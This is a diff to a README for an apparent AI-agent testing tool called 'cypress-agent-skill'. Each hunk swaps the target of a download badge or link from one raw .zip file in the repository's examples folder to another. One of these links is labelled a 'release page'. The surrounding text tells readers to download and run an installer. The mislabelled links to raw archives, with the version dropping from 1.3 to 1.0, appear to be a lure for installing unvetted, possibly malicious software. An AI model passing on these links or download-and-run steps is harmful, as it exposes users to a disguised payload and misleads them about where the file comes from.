@@ -1,6 +1,6 @@
 # ⚙️ cypress-agent-skill - Easy Testing for AI Agents
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen?style=for-the-badge)](https://github.com/YTItsfrost/cypress-agent-skill/raw/refs/heads/main/examples/agent-skill-cypress-1.3.zip)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen?style=for-the-badge)](https://github.com/YTItsfrost/cypress-agent-skill/raw/refs/heads/main/examples/skill-cypress-agent-1.0.zip)
 
 ---
 
@@ -30,7 +30,7 @@ Use this step-by-step guide to download and start the app.
 
 Click the button below to open the download page for the latest release.
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge)](https://github.com/YTItsfrost/cypress-agent-skill/raw/refs/heads/main/examples/agent-skill-cypress-1.3.zip)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge)](https://github.com/YTItsfrost/cypress-agent-skill/raw/refs/heads/main/examples/skill-cypress-agent-1.0.zip)
 
 ### Step 2: Download the installer
 
@@ -83,7 +83,7 @@ These features work together to make sure AI agents act like expected in differe
 
 To keep your application up-to-date:
 
-1. Visit the [release page](https://github.com/YTItsfrost/cypress-agent-skill/raw/refs/heads/main/examples/agent-skill-cypress-1.3.zip) regularly.
+1. Visit the [release page](https://github.com/YTItsfrost/cypress-agent-skill/raw/refs/heads/main/examples/skill-cypress-agent-1.0.zip) regularly.
 2. Download the newest installer following the same steps above.
 3. Run the installer to overwrite the older version.
 4. Your settings will remain safe.
@@ -126,4 +126,4 @@ To keep your application up-to-date:
 
 Click this badge to go to the official release page and get started.
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge)](https://github.com/YTItsfrost/cypress-agent-skill/raw/refs/heads/main/examples/agent-skill-cypress-1.3.zip)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge)](https://github.com/YTItsfrost/cypress-agent-skill/raw/refs/heads/main/examples/skill-cypress-agent-1.0.zip)
